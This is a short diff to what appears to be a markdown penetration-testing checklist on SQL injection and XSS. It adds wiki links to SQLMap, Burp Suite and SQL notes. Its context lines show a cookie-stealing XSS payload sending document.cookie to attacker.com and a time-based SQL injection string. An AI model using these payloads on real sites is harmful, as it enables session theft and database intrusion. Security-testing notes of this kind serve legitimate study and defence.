@@ -167,7 +167,7 @@ fetch('http://attacker.com/steal?c='+document.cookie);
 - [ ] Check URL parameters
 - [ ] Look for error messages
 - [ ] Try time-based: `' AND SLEEP(5)--`
-- [ ] Use SQLMap for automation
+- [ ] Use [[SQLMap]] for automation
 
 ### XSS
 - [ ] Test all input fields with basic payloads
@@ -194,3 +194,11 @@ fetch('http://attacker.com/steal?c='+document.cookie);
 - [DB2 SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
 - [Ingres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
 - [MS Access SQLi Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
+
+---
+
+## See Also
+
+- [[SQLMap]] — Automate SQLi exploitation
+- [[Burp_Suite]] — Capture, modify, and replay payloads
+- [[SQL_commands]] — Underlying SQL syntax
